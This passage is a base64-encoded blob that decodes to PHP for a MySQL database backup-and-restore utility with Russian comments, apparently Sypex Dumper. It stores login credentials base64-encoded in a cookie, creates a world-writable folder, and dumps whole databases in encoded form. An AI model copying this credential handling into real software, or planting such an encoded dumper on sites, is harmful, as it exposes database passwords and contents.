LbQvdC+INGC0LDQutC20LUg0YPQutCw0LfRi9Cy0LDRgtGMINGB0YDQsNCy0L3QtdC90LjQtSDQvdGD0LbQvdC+0LUg0Log0L/RgNC40LzQtdGA0YMgJ2NwMTI1MV91a3JhaW5pYW5fY2knINC40LvQuCAnZm9yY2VkLT5jcDEyNTFfdWtyYWluaWFuX2NpJwpkZWZpbmUoJ1JFU1RPUkVfQ0hBUlNFVCcsICd1dGY4X2JpbicpOwovLyBzYXZlIHNldHRpbmdzIGFuZCBsYXN0IGFjdGlvbnMKLy8gMCAtIGRpc2FibGUsIDEgLSBlbmFibGUKZGVmaW5lKCdTQycsIDEpOwovLyBUYWJsZSB0eXBlcyBmb3Igc3RvcmUgc3RydWN0IG9ubHkgKHNlcGFyYXRlZCBieSBjb21tYSkKZGVmaW5lKCdPTkxZX0NSRUFURScsICdNUkdfTXlJU0FNLE1FUkdFLEhFQVAsTUVNT1JZJyk7Ci8vIEdsb2JhbCBzdGF0cwovLyAwIC0gZGlzYWJsZSwgMSAtIGVuYWJsZQpkZWZpbmUoJ0dTJywgMCk7CgovLyBFbmQgY29uZmlndXJhdGlvbiBibG9jayAtIHN0YXJ0IGNvZGUgYmxvY2sKJGR1bXBlcl9maWxlID0gYmFzZW5hbWUoX19GSUxFX18pOwoKJGlzX3NhZmVfbW9kZSA9IGluaV9nZXQoJ3NhZmVfbW9kZScpID09ICcxJyA/IDEgOiAwOwppZiAoISRpc19zYWZlX21vZGUgJiYgZnVuY3Rpb25fZXhpc3RzKCdzZXRfdGltZV9saW1pdCcpKSBzZXRfdGltZV9saW1pdChUSU1FX0xJTUlUKTsKCmhlYWRlcigiRXhwaXJlczogVHVlLCAxIEp1bCAyMDAzIDA1OjAwOjAwIEdNVCIpOwpoZWFkZXIoIkxhc3QtTW9kaWZpZWQ6ICIgLiBnbWRhdGUoIkQsIGQgTSBZIEg6aTpzIikgLiAiIEdNVCIpOwpoZWFkZXIoIkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlIik7CmhlYWRlcigiUHJhZ21hOiBuby1jYWNoZSIpOwoKJHRpbWVyID0gYXJyYXlfc3VtKGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSkpOwpvYl9pbXBsaWNpdF9mbHVzaCgpOwplcnJvcl9yZXBvcnRpbmcoRV9BTEwpOwoKJGF1dGggPSAwOwokZXJyb3IgPSAnJzsKaWYgKCFlbXB0eSgkX1BPU1RbJ2xvZ2luJ10pICYmIGlzc2V0KCRfUE9TVFsncGFzcyddKSkgewogICAgICAgIGlmIChAbXlzcWxfY29ubmVjdChEQkhPU1QsICRfUE9TVFsnbG9naW4nXSwgJF9QT1NUWydwYXNzJ10pKXsKICAgICAgICAgICAgICAgIHNldGNvb2tpZSgic3hkIiwgYmFzZTY0X2VuY29kZSgiU0tEMTAxOnskX1BPU1RbJ2xvZ2luJ119OnskX1BPU1RbJ3Bhc3MnXX0iKSk7CiAgICAgICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAkZHVtcGVyX2ZpbGUiKTsKICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAkZXJyb3IgPSAnIycgLiBteXNxbF9lcnJubygpIC4gJzogJyAuIG15c3FsX2Vycm9yKCk7CiAgICAgICAgfQp9CmVsc2VpZiAoIWVtcHR5KCRfQ09PS0lFWydzeGQnXSkpIHsKICAgICR1c2VyID0gZXhwbG9kZSgiOiIsIGJhc2U2NF9kZWNvZGUoJF9DT09LSUVbJ3N4ZCddKSk7CiAgICAgICAgaWYgKEBteXNxbF9jb25uZWN0KERCSE9TVCwgJHVzZXJbMV0sICR1c2VyWzJdKSl7CiAgICAgICAgICAgICAgICAkYXV0aCA9IDE7CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAkZXJyb3IgPSAnIycgLiBteXNxbF9lcnJubygpIC4gJzogJyAuIG15c3FsX2Vycm9yKCk7CiAgICAgICAgfQp9CgppZiAoISRhdXRoIHx8IChpc3NldCgkX1NFUlZFUlsnUVVFUllfU1RSSU5HJ10pICYmICRfU0VSVkVSWydRVUVSWV9TVFJJTkcnXSA9PSAncmVsb2FkJykpIHsKICAgICAgICBzZXRjb29raWUoInN4ZCIpOwogICAgICAgIGVjaG8gdHBsX3BhZ2UodHBsX2F1dGgoJGVycm9yID8gdHBsX2Vycm9yKCRlcnJvcikgOiAnJyksICI8U0NSSVBUPmlmIChqc0VuYWJsZWQpIHtkb2N1bWVudC53cml0ZSgnPElOUFVUIFRZUEU9c3VibWl0IFZBTFVFPUFwcGx5PicpO308L1NDUklQVD4iKTsKICAgICAgICBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpLmlubmVySFRNTCA9ICciIC4gcm91bmQoYXJyYXlfc3VtKGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSkpIC0gJHRpbWVyLCA0KSAuICIgc2VjLic8L1NDUklQVD4iOwogICAgICAgIGV4aXQ7Cn0KaWYgKCFmaWxlX2V4aXN0cyhQQVRIKSAmJiAhJGlzX3NhZmVfbW9kZSkgewogICAgbWtkaXIoUEFUSCwgMDc3NykgfHwgdHJpZ2dlcl9lcnJvcigiQ2FuJ3QgY3JlYXRlIGRpciBmb3IgYmFja3VwIiwgRV9VU0VSX0VSUk9SKTsKfQoKJFNLID0gbmV3IGR1bXBlcigpOwpkZWZpbmUoJ0NfREVGQVVMVCcsIDEpOwpkZWZpbmUoJ0NfUkVTVUxUJywgMik7CmRlZmluZSgnQ19FUlJPUicsIDMpOwpkZWZpbmUoJ0NfV0FSTklORycsIDQpOwoKJGFjdGlvbiA9IGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pID8gJF9SRVFVRVNUWydhY3Rpb24nXSA6ICcnOwpzd2l0Y2goJGFjdGlvbil7CiAgICAgICAgY2FzZSAnYmFja3VwJzoKICAgICAgICAgICAgICAgICRTSy0+YmFja3VwKCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdyZXN0b3JlJzoKICAgICAgICAgICAgICAgICRTSy0+cmVzdG9yZSgpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICRTSy0+bWFpbigpOwp9CgpteXNxbF9jbG9zZSgpOwoKZWNobyAiPFNDUklQVD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZXInKS5pbm5lckhUTUwgPSAnIiAuIHJvdW5kKGFycmF5X3N1bShleHBsb2RlKCcgJywgbWljcm90aW1lKCkpKSAtICR0aW1lciwgNCkgLiAiIHNlYy4nPC9TQ1JJUFQ+IjsKCmNsYXNzIGR1bXBlciB7CiAgICAgICAgZnVuY3Rpb24gZHVtcGVyKCkgewogICAgICAgICAgICAgICAgaWYgKGZpbGVfZXhpc3RzKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiKSkgewogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUoUEFUSCAuICJkdW1wZXIuY2ZnLnBocCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnbGFzdF9hY3Rpb24nXSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfYmFja3VwJ10gPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsndGFibGVzJ10gPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXSAgPSA3OwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWydsYXN0X2RiX3Jlc3RvcmUnXSA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnRhYnMgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlY29yZHMgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPnNpemUgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPmNvbXAgPSAwOwoKICAgICAgICAgICAgICAgIC8vINCS0LXRgNGB0LjRjyBNeVNRTCDQstC40LTQsCA0MDEwMQogICAgICAgICAgICAgICAgcHJlZ19tYXRjaCgiL14oXGQrKVwuKFxkKylcLihcZCspLyIsIG15c3FsX2dldF9zZXJ2ZXJfaW5mbygpLCAkbSk7CiAgICAgICAgICAgICAgICAkdGhpcy0+bXlzcWxfdmVyc2lvbiA9IHNwcmludGYoIiVkJTAyZCUwMmQiLCAkbVsxXSwgJG1bMl0sICRtWzNdKTsKCiAgICAgICAgICAgICAgICAkdGhpcy0+b25seV9jcmVhdGUgPSBleHBsb2RlKCcsJywgT05MWV9DUkVBVEUpOwogICAgICAgICAgICAgICAgJHRoaXMtPmZvcmNlZF9jaGFyc2V0ICA9IGZhbHNlOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlc3RvcmVfY2hhcnNldCA9ICR0aGlzLT5yZXN0b3JlX2NvbGxhdGUgPSAnJzsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXihmb3JjZWQtPik/KChbYS16MC05XSspKFxfXHcrKT8pJC8iLCBSRVNUT1JFX0NIQVJTRVQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm9yY2VkX2NoYXJzZXQgID0gJG1hdGNoZXNbMV0gPT0gJ2ZvcmNlZC0+JzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnJlc3RvcmVfY2hhcnNldCA9ICRtYXRjaGVzWzNdOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cmVzdG9yZV9jb2xsYXRlID0gIWVtcHR5KCRtYXRjaGVzWzRdKSA/ICcgQ09MTEFURSAnIC4gJG1hdGNoZXNbMl0gOiAnJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGJhY2t1cCgpIHsKICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJF9QT1NUKSkgeyR0aGlzLT5tYWluKCk7fQogICAgICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoIlNYRF9lcnJvckhhbmRsZXIiKTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxBIElEPXNhdmUgSFJFRj0nJyBTVFlMRT0nZGlzcGxheTogbm9uZTsnPkRvd25sb2FkIGZpbGU8L0E+ICZuYnNwOyA8SU5QVVQgSUQ9YmFjayBUWVBFPWJ1dHRvbiBWQUxVRT0nQmFjaycgRElTQUJMRUQgb25DbGljaz1cImhpc3RvcnkuYmFjaygpO1wiPiI7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9wYWdlKHRwbF9wcm9jZXNzKCJEQiBiYWNrdXAgaW4gcHJvZ3Jlc3MiKSwgJGJ1dHRvbnMpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfYWN0aW9uJ10gICAgID0gMDsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfYmFja3VwJ10gID0gaXNzZXQoJF9QT1NUWydkYl9iYWNrdXAnXSkgPyAkX1BPU1RbJ2RiX2JhY2t1cCddIDogJyc7CiAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWyd0YWJsZXNfZXhjbHVkZSddICA9ICFlbXB0eSgkX1BPU1RbJ3RhYmxlcyddKSAmJiAkX1BPU1RbJ3RhYmxlcyddezB9ID09ICdeJyA/IDEgOiAwOwogICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsndGFibGVzJ10gICAgICAgICAgPSBpc3NldCgkX1BPU1RbJ3RhYmxlcyddKSA/ICRfUE9TVFsndGFibGVzJ10gOiAnJzsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gICAgID0gaXNzZXQoJF9QT1NUWydjb21wX21ldGhvZCddKSA/IGludHZhbCgkX1BPU1RbJ2NvbXBfbWV0aG9kJ10pIDogMDsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXSAgICAgID0gaXNzZXQoJF9QT1NUWydjb21wX2xldmVsJ10pID8gaW50dmFsKCRfUE9TVFsnY29tcF9sZXZlbCddKSA6IDA7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fc2F2ZSgpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ3RhYmxlcyddICAgICAgICAgID0gZXhwbG9kZSgiLCIsICR0aGlzLT5TRVRbJ3RhYmxlcyddKTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJF9QT1NUWyd0YWJsZXMnXSkpIHsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0aGlzLT5TRVRbJ3RhYmxlcyddIEFTICR0YWJsZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZSA9IHByZWdfcmVwbGFjZSgiL1teXHcqP15dLyIsICIiLCAkdGFibGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gYXJyYXkoICIvXD8vIiwgIi9cKi8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVwbGFjZSA9IGFycmF5KCAiLiIsICIuKj8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGJsc1tdID0gcHJlZ19yZXBsYWNlKCRwYXR0ZXJuLCAkcmVwbGFjZSwgJHRhYmxlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ3RhYmxlc19leGNsdWRlJ10gPSAxOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U0VUWydjb21wX2xldmVsJ10gPT0gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPSAwOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGRiID0gJHRoaXMtPlNFVFsnbGFzdF9kYl9iYWNrdXAnXTsKCiAgICAgICAgICAgICAgICBpZiAoISRkYikgewogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQntCo0JjQkdCa0JAhINCd0LUg0YPQutCw0LfQsNC90LAg0LHQsNC30LAg0LTQsNC90L3Ri9GFISIsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9lbmFibGVCYWNrKCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIkNvbm5lY3Rpb24gdG8gREIgYHskZGJ9YC4iKTsKICAgICAgICAgICAgICAgIG15c3FsX3NlbGVjdF9kYigkZGIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC1INGD0LTQsNC10YLRgdGPINCy0YvQsdGA0LDRgtGMINCx0LDQt9GDINC00LDQvdC90YvRhS48QlI+IiAuIG15c3FsX2Vycm9yKCksIEVfVVNFUl9FUlJPUik7CiAgICAgICAgICAgICAgICAkdGFibGVzID0gYXJyYXkoKTsKICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgVEFCTEVTIik7CiAgICAgICAgICAgICAgICAkYWxsID0gMDsKICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRibHMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0YmxzIEFTICR0YWJsZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4Y2x1ZGUgPSBwcmVnX21hdGNoKCIvXlxeLyIsICR0YWJsZSkgPyB0cnVlIDogZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkZXhjbHVkZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9eeyR0YWJsZX0kL2kiLCAkcm93WzBdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0dXMgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsbCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZXhjbHVkZSAmJiBwcmVnX21hdGNoKCIveyR0YWJsZX0kL2kiLCAkcm93WzBdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3RhdHVzID0gLTE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzdGF0dXMgPj0gJGFsbCkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGFibGVzW10gPSAkcm93WzBdOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgICAgICAgICAkdGFicyA9IGNvdW50KCR0YWJsZXMpOwogICAgICAgICAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LvQtdC90LjQtSDRgNCw0LfQvNC10YDQvtCyINGC0LDQsdC70LjRhgogICAgICAgICAgICAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCJTSE9XIFRBQkxFIFNUQVRVUyIpOwogICAgICAgICAgICAgICAgJHRhYmluZm8gPSBhcnJheSgpOwogICAgICAgICAgICAgICAgJHRhYl9jaGFyc2V0ID0gYXJyYXkoKTsKICAgICAgICAgICAgICAgICR0YWJfdHlwZSA9IGFycmF5KCk7CiAgICAgICAgICAgICAgICAkdGFiaW5mb1swXSA9IDA7CiAgICAgICAgICAgICAgICAkaW5mbyA9ICcnOwogICAgICAgICAgICAgICAgd2hpbGUoJGl0ZW0gPSBteXNxbF9mZXRjaF9hc3NvYygkcmVzdWx0KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vcHJpbnRfcigkaXRlbSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGluX2FycmF5KCRpdGVtWydOYW1lJ10sICR0YWJsZXMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJ1Jvd3MnXSA9IGVtcHR5KCRpdGVtWydSb3dzJ10pID8gMCA6ICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmluZm9bMF0gKz0gJGl0ZW1bJ1Jvd3MnXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFiaW5mb1skaXRlbVsnTmFtZSddXSA9ICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpemUgKz0gJGl0ZW1bJ0RhdGFfbGVuZ3RoJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnNpemVbJGl0ZW1bJ05hbWUnXV0gPSAxICsgcm91bmQoTElNSVQgKiAxMDQ4NTc2IC8gKCRpdGVtWydBdmdfcm93X2xlbmd0aCddICsgMSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpdGVtWydSb3dzJ10pICRpbmZvIC49ICJ8IiAuICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkaXRlbVsnQ29sbGF0aW9uJ10pICYmIHByZWdfbWF0Y2goIi9eKFthLXowLTldKylfL2kiLCAkaXRlbVsnQ29sbGF0aW9uJ10sICRtKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYl9jaGFyc2V0WyRpdGVtWydOYW1lJ11dID0gJG1bMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJfdHlwZVskaXRlbVsnTmFtZSddXSA9IGlzc2V0KCRpdGVtWydFbmdpbmUnXSkgPyAkaXRlbVsnRW5naW5lJ10gOiAkaXRlbVsnVHlwZSddOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc2hvdyA9IDEwICsgJHRhYmluZm9bMF0gLyA1MDsKICAgICAgICAgICAgICAgICRpbmZvID0gJHRhYmluZm9bMF0gLiAkaW5mbzsKICAgICAgICAgICAgICAgICRuYW1lID0gJGRiIC4gJ18nIC4gZGF0ZSgiWS1tLWRfSC1pIik7CiAgICAgICAgJGZwID0gJHRoaXMtPmZuX29wZW4oJG5hbWUsICJ3Iik7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJDcmVhdGUgZmlsZSB3aXRoIGJhY2t1cCBvZiBEQjo8QlI+XFxuICAtICB7JHRoaXMtPmZpbGVuYW1lfSIpOwogICAgICAgICAgICAgICAgJHRoaXMtPmZuX3dyaXRlKCRmcCwgIiNTS0QxMDF8eyRkYn18eyR0YWJzfXwiIC4gZGF0ZSgiWS5tLmQgSDppOnMiKSAuInx7JGluZm99XG5cbiIpOwogICAgICAgICAgICAgICAgJHQ9MDsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNFVCBTUUxfUVVPVEVfU0hPV19DUkVBVEUgPSAxIik7CiAgICAgICAgICAgICAgICAvLyDQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0L/QviDRg9C80L7Qu9GH0LDQvdC40Y4KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+bXlzcWxfdmVyc2lvbiA+IDQwMTAxICYmIENIQVJTRVQgIT0gJ2F1dG8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiBDSEFSU0VUIC4gIiciKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtdGD0LTQsNC10YLRgdGPINC40LfQvNC10L3QuNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDINGB0L7QtdC00LjQvdC10L3QuNGPLjxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9IENIQVJTRVQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJyc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHRhYmxlcyBBUyAkdGFibGUpewogICAgICAgICAgICAgICAgICAgICAgICAvLyDQktGL0YHRgtCw0LLQu9GP0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8g0YHQvtC+0YLQstC10YLRgdGC0LLRg9GO0YnRg9GOINC60L7QtNC40YDQvtCy0LrQtSDRgtCw0LHQu9C40YbRiwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPm15c3FsX3ZlcnNpb24gPiA0MDEwMSAmJiAkdGFiX2NoYXJzZXRbJHRhYmxlXSAhPSAkbGFzdF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKENIQVJTRVQgPT0gJ2F1dG8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBteXNxbF9xdWVyeSgiU0VUIE5BTUVTICciIC4gJHRhYl9jaGFyc2V0WyR0YWJsZV0gLiAiJyIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC10YPQtNCw0LXRgtGB0Y8g0LjQt9C80LXQvdC40YLRjCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8uPEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkdGFiX2NoYXJzZXRbJHRhYmxlXSAuICJgLiIsIENfV0FSTklORyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRhYl9jaGFyc2V0WyR0YWJsZV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCfQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0Lgg0YLQsNCx0LvQuNGG0Ysg0L3QtSDRgdC+0LLQv9Cw0LTQsNC10YI6JywgQ19FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCdUYWJsZSBgJy4gJHRhYmxlIC4nYCAtPiAnIC4gJHRhYl9jaGFyc2V0WyR0YWJsZV0gLiAnICjRgdC+0LXQtNC40L3QtdC90LjQtSAnICAuIENIQVJTRVQgLiAnKScsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQntCx0YDQsNCx0L7RgtC60LAg0YLQsNCx0LvQuNGG0YsgYHskdGFibGV9YCBbIiAuIGZuX2ludCgkdGFiaW5mb1skdGFibGVdKSAuICJdLiIpOwogICAgICAgICAgICAgICAgLy8gQ3JlYXRlIHRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBDUkVBVEUgVEFCTEUgYHskdGFibGV9YCIpOwogICAgICAgICAgICAgICAgJHRhYiA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQpOwogICAgICAgICAgICAgICAgICAgICAgICAkdGFiID0gcHJlZ19yZXBsYWNlKCcvKGRlZmF1bHQgQ1VSUkVOVF9USU1FU1RBTVAgb24gdXBkYXRlIENVUlJFTlRfVElNRVNUQU1QfERFRkFVTFQgQ0hBUlNFVD1cdyt8Q09MTEFURT1cdyt8Y2hhcmFjdGVyIHNldCBcdyt8Y29sbGF0ZSBcdyspL2knLCAnLyohNDAxMDEgXFwxICovJywgJHRhYik7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiRFJPUCBUQUJMRSBJRiBFWElTVFMgYHskdGFibGV9YDtcbnskdGFiWzFdfTtcblxuIik7CiAgICAgICAgICAgICAgICAvLyBDaGVjazogTmVlZCB0byBkdW1wIGRhdGE/CiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHRhYl90eXBlWyR0YWJsZV0sICR0aGlzLT5vbmx5X2NyZWF0ZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LTQtdC70Y/QtdC8INGC0LjQv9GLINGB0YLQvtC70LHRhtC+0LIKICAgICAgICAgICAgJE51bWVyaWNDb2x1bW4gPSBhcnJheSgpOwogICAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgQ09MVU1OUyBGUk9NIGB7JHRhYmxlfWAiKTsKICAgICAgICAgICAgJGZpZWxkID0gMDsKICAgICAgICAgICAgd2hpbGUoJGNvbCA9IG15c3FsX2ZldGNoX3JvdygkcmVzdWx0KSkgewogICAgICAgICAgICAgICAgJE51bWVyaWNDb2x1bW5bJGZpZWxkKytdID0gcHJlZ19tYXRjaCgiL14oXHcqaW50fHllYXIpLyIsICRjb2xbMV0pID8gMSA6IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9ICRmaWVsZDsKICAgICAgICAgICAgJGZyb20gPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAkbGltaXQgPSAkdGFic2l6ZVskdGFibGVdOwogICAgICAgICAgICAgICAgICAgICAgICAkbGltaXQyID0gcm91bmQoJGxpbWl0IC8gM